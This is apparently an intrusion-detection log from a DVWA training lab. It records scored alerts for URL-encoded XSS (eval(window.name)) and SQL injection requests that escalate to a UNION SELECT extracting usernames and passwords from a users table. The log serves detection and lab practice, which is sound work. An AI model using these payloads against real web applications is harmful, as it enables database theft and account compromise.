"local/unknown",2010-03-15T23:07:01+00:00,72,"xss csrf id rfe lfi sqli","REQUEST.test=%22%3E%3Cscript%3Eeval%28window.name%29%3C%2Fscript%3E GET.test=%22%3E%3Cscript%3Eeval%28window.name%29%3C%2Fscript%3E","%2Fdvwa%2Fsecurity.php%3Ftest%3D%2522%253E%253Cscript%253Eeval%28window.name%29%253C%2Fscript%253E","127.0.0.1"
"23.27.44.130",2022-10-25T04:39:40+02:00,46,"xss csrf sqli id lfi","REQUEST.id=%271%27%3D%271 GET.id=%271%27%3D%271","%2Fdvwa%2Fvulnerabilities%2Fsqli%2F%3Fid%3D%25271%2527%253D%25271%26Submit%3DSubmit","10.138.0.2"
"23.27.44.130",2022-10-25T04:39:56+02:00,12,"sqli id lfi","REQUEST.id=%25%27 GET.id=%25%27","%2Fdvwa%2Fvulnerabilities%2Fsqli%2F%3Fid%3D%2525%2527%26Submit%3DSubmit","10.138.0.2"
"23.27.44.130",2022-10-25T04:44:00+02:00,12,"sqli id lfi","REQUEST.id=%25%27 GET.id=%25%27","%2Fdvwa%2Fvulnerabilities%2Fsqli%2F%3Fid%3D%2525%2527%26Submit%3DSubmit","10.138.0.2"
"23.27.44.130",2022-10-25T04:44:44+02:00,46,"xss csrf sqli id lfi","REQUEST.id=%270%27%3D%270 GET.id=%270%27%3D%270","%2Fdvwa%2Fvulnerabilities%2Fsqli%2F%3Fid%3D%25270%2527%253D%25270%26Submit%3DSubmit","10.138.0.2"
"23.27.44.130",2022-10-25T04:45:28+02:00,30,"xss csrf id sqli rfe lfi","REQUEST.id=%270union%20select%20null%2C%20version%28%29%20%23 GET.id=%270union%20select%20null%2C%20version%28%29%20%23","%2Fdvwa%2Fvulnerabilities%2Fsqli%2F%3Fid%3D%25270union%2Bselect%2Bnull%252C%2Bversion%2528%2529%2B%2523%26Submit%3DSubmit","10.138.0.2"
"23.27.44.130",2022-10-25T04:45:49+02:00,30,"xss csrf id sqli rfe lfi","REQUEST.id=%270union%20select%20null%2C%20version%28%29%20%23 GET.id=%270union%20select%20null%2C%20version%28%29%20%23","%2Fdvwa%2Fvulnerabilities%2Fsqli%2F%3Fid%3D%25270union%2Bselect%2Bnull%252C%2Bversion%2528%2529%2B%2523%26Submit%3DSubmit","10.138.0.2"
"23.27.44.130",2022-10-25T04:47:07+02:00,68,"xss csrf id sqli lfi rfe","REQUEST.id=%25%27%20and%201%3D0%20union%20select%20null%2C%20table_name%20from%20information_schema.tables%20%23 GET.id=%25%27%20and%201%3D0%20union%20select%20null%2C%20table_name%20from%20information_schema.tables%20%23","%2Fdvwa%2Fvulnerabilities%2Fsqli%2F%3Fid%3D%2525%2527%2Band%2B1%253D0%2Bunion%2Bselect%2Bnull%252C%2Btable_name%2Bfrom%2Binformation_schema.tables%2B%2523%26Submit%3DSubmit","10.138.0.2"
"23.27.44.130",2022-10-25T04:48:04+02:00,76,"xss csrf id rfe sqli lfi","REQUEST.id=%25%27%20and%201%3D0%20union%20select%20null%2C%20concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29%20from%20users%20%23 GET.id=%25%27%20and%201%3D0%20union%20select%20null%2C%20concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29%20from%20users%20%23","%2Fdvwa%2Fvulnerabilities%2Fsqli%2F%3Fid%3D%2525%2527%2Band%2B1%253D0%2Bunion%2Bselect%2Bnull%252C%2Bconcat%2528first_name%252C0x0a%252Clast_name%252C0x0a%252Cuser%252C0x0a%252Cpassword%2529%2Bfrom%2Busers%2B%2523%26Submit%3DSubmit","10.138.0.2"
"23.27.44.130",2022-10-25T04:48:48+02:00,76,"xss csrf id rfe sqli lfi","REQUEST.id=%25%27%20and%201%3D0%20union%20select%20null%2C%20concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29%20from%20users%20%23 GET.id=%25%27%20and%201%3D0%20union%20select%20null%2C%20concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29%20from%20users%20%23","%2Fdvwa%2Fvulnerabilities%2Fsqli%2F%3Fid%3D%2525%2527%2Band%2B1%253D0%2Bunion%2Bselect%2Bnull%252C%2Bconcat%2528first_name%252C0x0a%252Clast_name%252C0x0a%252Cuser%252C0x0a%252Cpassword%2529%2Bfrom%2Busers%2B%2523%26Submit%3DSubmit","10.138.0.2"
"23.27.44.130",2022-10-25T04:50:07+02:00,76,"xss csrf id rfe sqli lfi","REQUEST.id=%25%27%20and%201%3D0%20union%20select%20null%2C%20concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29%20from%20users%20%23 GET.id=%25%27%20and%201%3D0%20union%20select%20null%2C%20concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29%20from%20users%20%23","%2Fdvwa%2Fvulnerabilities%2Fsqli%2F%3Fid%3D%2525%2527%2Band%2B1%253D0%2Bunion%2Bselect%2Bnull%252C%2Bconcat%2528first_name%252C0x0a%252Clast_name%252C0x0a%252Cuser%252C0x0a%252Cpassword%2529%2Bfrom%2Busers%2B%2523%26Submit%3DSubmit","10.138.0.2"
